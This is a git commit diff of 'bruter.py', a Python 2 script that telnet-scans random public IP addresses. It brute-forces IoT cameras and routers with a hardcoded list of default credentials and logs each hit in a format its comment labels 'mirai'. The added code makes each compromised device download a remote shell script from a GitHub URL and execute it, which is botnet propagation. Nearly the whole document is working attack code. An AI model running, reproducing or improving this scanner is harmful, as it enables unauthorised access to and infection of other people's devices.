330ae42c6853e4092836e29af7bc27a48c023d4f
20Matrix77 <101499676+20Matrix77@users.noreply.github.com>
2024-11-05 18:07:52 +0500

    Update bruter.py

--- bruter.py
+++ bruter.py
@@ -1,89 +1,63 @@
 import threading
 import sys, os, re, time, socket
-from Queue import *
 from sys import stdout
- 
-if len(sys.argv) < 4:
-    print "Usage: python "+sys.argv[0]+" <list> <threads> <output file>"
+
+if len(sys.argv) < 3:
+    print "Usage: python "+sys.argv[0]+" <threads> <output file>"
     sys.exit()
- 
-ips = open(sys.argv[1], "r").readlines()
-threads = int(sys.argv[2])
-output_file = sys.argv[3]
-queue = Queue()
-queue_count = 0
- 
-combo = [ #use as many passwords as ya want(P.S. The more passwords the slower the bruteforce is going to be)
-    "root:xc3511",
-    "root:vizxv",
-    "root:admin",
+
+combo = [
     "admin:admin",
-    "root:888888",
-    "root:xmhdipc",
-    "root:default",
-    "root:juantech",
-    "root:123456",
-    "root:54321",
-    "support:support",
-    "root: ",
-    "admin:password",
-    "root:root",
-    "root:12345",
-    "user:user",
-    "admin:",
-    "root:pass",
-    "admin:admin1234",
-    "root:1111",
-    "admin:smcadmin",
-    "admin:1111",
-    "root:666666",
-    "root:password",
-    "root:1234",
-    "root:klv123",
-    "Administrator:admin",
-    "service:service",
-    "supervisor:supervisor",
-    "guest:guest",
-    "guest:12345",
-    "guest:12345",
-    "admin1:password",
-    "administrator:1234",
-    "666666:666666",
-    "888888:888888",
-    "ubnt:ubnt",
-    "root:klv1234",
-    "root:Zte521",
+    "root:founder88",
+    "root:hikvision",
     "root:hi3518",
-    "root:jvbzd",
-    "root:anko",
-    "root:zlxx.",
-    "root:7ujMko0vizxv",
-    "root:7ujMko0admin",
-    "root:system",
-    "root:ikwb",
-    "root:dreambox",
-    "root:user",
-    "root:realtek",
-    "root:00000000",
-    "admin:1111111",
-    "admin:1234",
-    "admin:12345",
-    "admin:54321",
-    "admin:123456",
-    "admin:7ujMko0admin",
-    "admin:1234",
-    "admin:pass",
-    "admin:meinsm",
-    "tech:tech"
+    "admin:ipcam_rt5350",
+    "root:Zte521",
+    "root:grouter",
+    "default:v2mprt",
+    "default:vhd1206",
+    "root:vertex25ektks123",
+    "root:IPCam@sw",
+    "root:hslwificam",
+    "vstarcam2015:20150602",
+    "root:zte9x15",
+    "admin:dvr2580222",
+    "root:D13hh[",
+    "admin:CenturyL1nk",
+    "admin:ZmqVfoSIP",
+    "admin:vodafone",
+    "root:GM8182",
+    "admin:Uq-4GIt3M",
+    "default:nmgx_wapia",
+    "admin:samsung",
+    "admin:QwestM0dem",
+    "root:taZz@23495859",
+    "root:zhongxing",
+    "admin:netgear1",
+    "root:hg2x0",
+    "root:taZz@01",
+    "root:cam1029",
+    "root:tsgoingon",
+    "root:dvr",
+    "root:camera",
+    "admin:/ADMIN/",
+    "root:twe8ehome",
+    "telnet:telnet",
+    "vodafone:vodafone",
+    "default:tlJwpbo6",
+    "default:S2fGqNFs",
+    "default:OxhlwSG8",
+    "root:qwertyuiop",
+    "root:uClinux",
+    "telnetadmin:telnetadmin",
+    "root:2011vsta",
+    "root:fidel123"
 ]
- 
-for ip in ips:
-    queue_count += 1
-    stdout.write("\r[%d] Added to queue" % queue_count)
-    stdout.flush()
-    queue.put(ip)
-print "\n"
- 
+
+
+threads = int(sys.argv[1])
+output_file = sys.argv[2]
+
 class router(threading.Thread):
     def __init__ (self, ip):
         threading.Thread.__init__(self)
@@ -112,7 +86,7 @@ class router(threading.Thread):
                 hoho += readUntil(tn, "ogin:")
                 if "ogin" in hoho:
                     tn.send(username + "\n")
-                    time.sleep(2)
+                    time.sleep(0.09)
             except Exception:
                 tn.close()
             try:
@@ -120,7 +94,7 @@ class router(threading.Thread):
                 hoho += readUntil(tn, "assword:")
                 if "assword" in hoho:
                     tn.send(password + "\n")
-                    time.sleep(2)
+                    time.sleep(0.8)
                 else:
                     pass
             except Exception:
@@ -129,65 +103,25 @@ class router(threading.Thread):
                 prompt = ''
                 prompt += tn.recv(40960)
                 if ">" in prompt and "ONT" not in prompt:
-                    try:
-                        tn.send("cat | sh" + "\n")
-                        time.sleep(1)
-                        success = False
-                        timeout = 8
-                        data = ["BusyBox", "Built-in"]
-                        tn.send("sh" + "\n")
-                        time.sleep(1)
-                        tn.send("busybox" + "\r\n")
-                        buf = '' # NO FALSE POSSITIVES OVA HERE
-                        start_time = time.time()
-                        while time.time() - start_time < timeout:
-                            buf += tn.recv(40960)
-                            time.sleep(1)
-                            for info in data:
-                                if info in buf and "unrecognized" not in buf:
-                                    success = True
-                                    break
-                    except:
-                        pass
+                    success = True
                 elif "#" in prompt or "$" in prompt or "%" in prompt or "@" in prompt:
-                    try:
-                        success = False
-                        timeout = 8
-                        data = ["BusyBox", "Built-in"]
-                        tn.send("sh" + "\n")
-                        time.sleep(0.01)
-                        tn.send("shell" + "\n")
-                        time.sleep(0.01)
-                        tn.send("help" + "\n")
-                        time.sleep(0.01)
-                        tn.send("busybox" + "\r\n")
-                        buf = '' # NO FALSE POSSITIVES OVA HERE
-                        start_time = time.time()
-                        while time.time() - start_time < timeout:
-                            buf += tn.recv(40960)
-                            time.sleep(0.01)
-                            for info in data:
-                                if info in buf and "unrecognized" not in buf:
-                                    success = True
-                                    break
-                    except:
-                        pass
+                    success = True              
                 else:
                     tn.close()
                 if success == True:
                     try:
-                        #os.system("echo "+self.ip+" >> "+output_file+"") #1.1.1.1 # bios.txt
-                        #os.system("echo "+self.ip+":"+username+":"+password+" >> "+output_file+"")    # 1.1.1.1:user:pass # regular
                         os.system("echo "+self.ip+":23 "+username+":"+password+" >> "+output_file+"") # 1.1.1.1:23 user:pass # mirai
+                        tn.send("wget https://raw.githubusercontent.com/20Matrix77/scanner/refs/heads/main/animma.sh; chmod 777 animma.sh; sh animma.sh\n")
                         print "\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, self.ip)
                         tn.close()
                         break
                     except:
                         tn.close()
-                tn.close()
+                else:
+                    tn.close()
             except Exception:
                 tn.close()
- 
+
 def readUntil(tn, string, timeout=8):
     buf = ''
     start_time = time.time()
@@ -196,25 +130,36 @@ def readUntil(tn, string, timeout=8):
         time.sleep(0.01)
         if string in buf: return buf
     raise Exception('TIMEOUT!')
- 
-def worker():
-    try:
-        while True:
-            try:
-                IP = queue.get()
-                thread = router(IP)
-                thread.start()
-                queue.task_done()
-                time.sleep(0.2)
-            except:
-                pass
-    except:
-        pass
- 
-for l in xrange(threads):
-    try:
-        t = threading.Thread(target=worker)
-        t.start()
-        time.sleep(0.01)
-    except:
-        pass
+
+def Gen_IP():
+    not_valid = [10,127,169,172,192]
+    first = random.randrange(1,256)
+    while first in not_valid:
+        first = random.randrange(1,256)
+    ip = ".".join([str(first),str(random.randrange(1,256)),
+    str(random.randrange(1,256)),str(random.randrange(1,256))])
+    return ip
+
+def HaxThread():
+    while 1:
+        try:
+            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(370)
+            IP = Gen_IP()
+            s.connect((IP, 23))
+            s.close()
+            print "\033[32m[\033[31m+\033[32m] FOUND " + IP
+            thread = router(IP)
+            thread.start()
+        except:
+            pass
+
+if __name__ == "__main__":
+    threadcount = 0
+    for i in xrange(0,threads):
+        try:
+            threading.Thread(target=HaxThread, args=()).start()
+            threadcount += 1
+        except:
+            pass
+    print "[*] Started " + str(threadcount) + " scanner threads!"
